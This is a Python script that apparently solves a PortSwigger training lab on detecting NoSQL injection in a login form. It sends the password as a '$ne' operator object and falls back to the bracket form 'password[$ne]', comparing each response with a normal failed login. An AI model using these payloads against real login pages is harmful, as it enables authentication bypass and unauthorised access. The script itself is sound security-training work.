"""
Lab 1: Detecting NoSQL injection
https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-detecting
Difficulty: Apprentice

📝 Swap the password value for an operator object ({"$ne": "invalid"})
instead of a plain string — a DIFFERENT response than a normal failed
login confirms the operator got interpreted, not just treated as text.
"""

from utils import get_session, login_attempt, log, note

TARGET = "https://YOUR-LAB-ID.web-security-academy.net"
LOGIN_PATH = "/login"


def run():
    s = get_session()

    note("Baseline: normal failed login.")
    r1 = login_attempt(s, f"{TARGET}{LOGIN_PATH}", "carlos", "invalid")
    log(f"Baseline status {r1.status_code}: {r1.text[:200]}")

    note("Injection attempt: password as an operator object instead of a")
    note("plain string.")
    r2 = login_attempt(s, f"{TARGET}{LOGIN_PATH}", "carlos", {"$ne": "invalid"})
    log(f"Injected status {r2.status_code}: {r2.text[:200]}")

    if r1.text != r2.text:
        log("Response DIFFERS from baseline — NoSQL operator injection confirmed.")
    else:
        log("No difference observed — try form-encoded bracket syntax instead:", ok=False)
        r3 = s.post(f"{TARGET}{LOGIN_PATH}", data={"username": "carlos", "password[$ne]": "invalid"})
        log(f"Bracket-syntax status {r3.status_code}: {r3.text[:200]}")


if __name__ == "__main__":
    run()
